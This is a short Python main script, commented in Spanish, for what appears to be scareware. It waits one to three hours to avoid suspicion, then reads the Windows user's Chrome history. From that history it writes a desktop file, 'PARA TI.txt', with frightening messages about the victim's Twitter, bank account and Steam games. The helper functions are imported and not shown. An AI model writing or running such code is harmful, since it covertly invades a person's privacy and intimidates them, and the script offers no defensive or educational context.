from functions import *

HACKER_FILE_NAME = "PARA TI.txt"



def main():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Calculamos la ruta del usuario de Windows
    user_path = get_user_path()
    # Recogemos su historial de google chrome, cuando sea posible...
    chrome_history = get_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()